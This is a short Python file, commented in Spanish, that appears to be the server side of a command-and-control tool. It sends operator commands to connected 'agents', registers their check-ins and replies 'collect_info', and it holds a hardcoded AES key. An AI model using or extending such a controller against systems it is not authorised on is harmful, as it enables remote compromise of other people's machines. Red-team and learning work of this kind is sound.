import sys
import os
import asyncio
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)
from crypto.aes_encryptor import AESEncryptor

class Crocodile:
    def __init__(self):
        key = b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.sessions = {}

    async def start(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        if not isinstance(reader, asyncio.StreamReader):
            raise TypeError("reader debe ser una instancia de asyncio.StreamReader")
        while True:
            try: 
                command =  await self.get_input("#>: ")
                if command.lower() == "exit":
                    break
                r = command.encode('utf-8')
                writer.write(r)
                resp = await reader.read(36)
                if not resp:
                    print("🔴 El cliente cerró la conexión.")
                    break
                    
                print("Respuesta recibida:", resp.decode("utf-8", errors="replace"))
            except Exception as e:
                print("ocurrio un error", e)
        
    async def get_input(self,prompt: str):
        return await asyncio.to_thread(input, prompt)

    async def process_check_in(self, data: str) -> tuple:
        """Procesa el check-in de un agente."""
        agent_id, metadata = data.split("|")
        self.sessions[agent_id] = metadata
        return agent_id, "collect_info"
